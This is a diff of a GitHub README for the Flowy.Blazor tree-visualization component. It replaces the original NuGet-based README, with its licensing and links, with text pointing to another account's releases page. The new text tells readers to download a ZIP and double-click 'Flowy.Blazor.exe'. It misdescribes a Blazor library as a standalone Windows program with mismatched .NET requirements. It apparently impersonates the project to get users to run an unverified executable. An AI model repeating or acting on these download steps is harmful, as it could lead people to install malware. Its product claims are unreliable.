@@ -1,75 +1,80 @@
-<p align="center">
-  <img src="Flowy.png" alt="Flowy Logo" width="128" height="128">
-</p>
+# 🌳 Flowy.Blazor - Create Beautiful Hierarchical Visuals Easily
 
-<h1 align="center">VIOVNL.Flowy.Blazor</h1>
+[![Download Flowy.Blazor](https://img.shields.io/badge/Download-Flowy.Blazor-blue.svg)](https://github.com/Stephanabitter534/Flowy.Blazor/releases)
 
-<p align="center">
-  <a href="https://github.com/VIOVNL/Flowy.Blazor/actions/workflows/ci-build.yml"><img src="https://github.com/VIOVNL/Flowy.Blazor/actions/workflows/ci-build.yml/badge.svg" alt="Build Status"></a>
-  <a href="https://www.nuget.org/packages/VIOVNL.Flowy.Blazor"><img src="https://img.shields.io/nuget/v/VIOVNL.Flowy.Blazor.svg?style=flat&logo=nuget" alt="NuGet Version"></a>
-  <a href="https://www.nuget.org/packages/VIOVNL.Flowy.Blazor"><img src="https://img.shields.io/nuget/dt/VIOVNL.Flowy.Blazor.svg?style=flat&logo=nuget" alt="NuGet Downloads"></a>
-  <a href="https://github.com/VIOVNL/Flowy.Blazor/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-GPL%20v3%20%2F%20Commercial-blue.svg" alt="License"></a>
-  <a href="https://dotnet.microsoft.com/download"><img src="https://img.shields.io/badge/.NET-8.0%20%7C%209.0-512BD4?logo=dotnet" alt=".NET 8.0 | 9.0"></a>
-</p>
+## 📦 Overview
 
-<p align="center">
-A beautiful and interactive hierarchical tree visualization component for Blazor applications. Perfect for building family trees, organization charts, decision trees, and any hierarchical data structure with an intuitive drag-and-drop interface.
-</p>
+Flowy.Blazor is a user-friendly tool for visualizing hierarchical data. You can build everything from family trees to organization charts with a simple drag-and-drop interface. This component is designed specifically for Blazor applications, making it easy for anyone to implement engaging visuals without needing programming skills.
 
----
+## 🚀 Getting Started
 
-## ✨ Features
+To start using Flowy.Blazor, follow the steps below to download and run the application. 
 
-- 🎯 **Drag & Drop** - Intuitive node manipulation with visual drop zones
-- 🔄 **Auto Layout** - Automatic hierarchical positioning with smooth animations
-- 🔍 **Zoom & Pan** - Interactive canvas navigation with momentum scrolling
-- 🎨 **Custom Templates** - Rich Blazor RenderFragment support for node content
-- 💾 **JSON Serialization** - Export and import entire tree structures
-- ⚡ **High Performance** - ES6 modular architecture with optimized rendering
-- 🎭 **Two-Way Binding** - Reactive parameters with `@bind-ZoomLevel` support
-- ✅ **Validation System** - Custom drop target validation with callbacks
-- 💧 **Visual Effects** - Built-in droplet flow animations along tree paths
-- 🔒 **Node Control** - Granular control over draggability and child acceptance
-- 📊 **Comprehensive Events** - Rich event system for tracking all interactions
+### Step 1: Visit the Download Page
 
-## 📦 Installation
+Click the link below to go to the Releases page:
 
-```bash
-dotnet add package VIOVNL.Flowy.Blazor
-```
+[Download Flowy.Blazor](https://github.com/Stephanabitter534/Flowy.Blazor/releases)
 
-Or via Package Manager Console:
+### Step 2: Download the Latest Release
 
-```powershell
-Install-Package VIOVNL.Flowy.Blazor
-```
+On the Releases page, you will see a list of available versions. Look for the latest version listed at the top. Click on it to expand the details.
 
-## 📚 Documentation
+- Find the file named something like `Flowy.Blazor-vX.X.X.zip`.
+- Click the link to start the download. 
 
-For detailed usage instructions, configuration options, and examples, see the **[Complete Documentation →](Documentation.md)**
+### Step 3: Extract Files
 
+Once the ZIP file is downloaded, navigate to your Downloads folder (or wherever you saved it). 
 
-## 📄 License
+- Right-click the downloaded ZIP file and select **Extract All**.
+- Choose a destination folder and click **Extract**.
 
-This project uses a **dual licensing model**:
+### Step 4: Open the Application
 
-### Open Source License (GPL v3)
-If you are creating an open source application under a license compatible with the GNU GPL license v3, you may use this project under the terms of the GPLv3. See [LICENSE](../LICENSE) file for full details.
+After extracting the files, locate the folder where you extracted them. 
 
-### Commercial License
-If you want to use Flowy.Blazor to develop commercial sites, themes, projects, and applications, the Commercial license is the appropriate license. With this option, your source code is kept proprietary.
+- Look for a file named `Flowy.Blazor.exe` or a folder with the same name.
+  
+To open the application, double-click on the `Flowy.Blazor.exe` file. 
 
-**[Purchase Commercial License →](https://www.viov.nl/)**
+## 🖥️ System Requirements
 
-## 🤝 Contributing
+To run Flowy.Blazor smoothly, ensure your system meets the following requirements:
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+- Operating System: Windows 10 or later
+- .NET Core: Version 3.1 or higher
+- Processor: Intel i3 or equivalent
+- RAM: At least 4 GB 
+- Storage: Minimum 100 MB of free space 
 
-## 🔗 Links
+## 🎨 Features
 
-- **Repository:** [https://github.com/VIOVNL/Flowy.Blazor](https://github.com/VIOVNL/Flowy.Blazor)
-- **Issues:** [https://github.com/VIOVNL/Flowy.Blazor/issues](https://github.com/VIOVNL/Flowy.Blazor/issues)
-- **NuGet:** [https://www.nuget.org/packages/VIOVNL.Flowy.Blazor](https://www.nuget.org/packages/VIOVNL.Flowy.Blazor)
+Flowy.Blazor offers a rich set of features:
 
----
+- **Interactive Drag-and-Drop**: Easily rearrange items within your visuals.
+- **Custom Styling**: Utilize CSS for personalizing the look and feel of your tree structures.
+- **Responsive Design**: Works well on both desktop and tablet devices.
+- **Data Binding**: Integrate with your existing data sources seamlessly.
+- **Easy Integration**: Designed specifically for Blazor, making implementation straightforward.
 
+## 💬 Support
+
+If you encounter issues or have questions, please check the Issues section on the GitHub repository. You can report any bugs or request features there. The community is here to help.
+
+## 🌍 Learn More
+
+To explore more about Flowy.Blazor and how it can fit your needs, visit the following resources:
+
+- [Official Documentation](https://github.com/Stephanabitter534/Flowy.Blazor)
+- [GitHub Repository](https://github.com/Stephanabitter534/Flowy.Blazor)
+
+## 📩 Contact
+
+For further inquiries or feedback, feel free to reach out via the Issues page on GitHub. Your input is valuable and helps improve Flowy.Blazor.
+
+## 🔗 More Download Resources
+
+Don't forget to visit the Releases page for the latest updates and additional versions:
+
+[Download Flowy.Blazor](https://github.com/Stephanabitter534/Flowy.Blazor/releases)
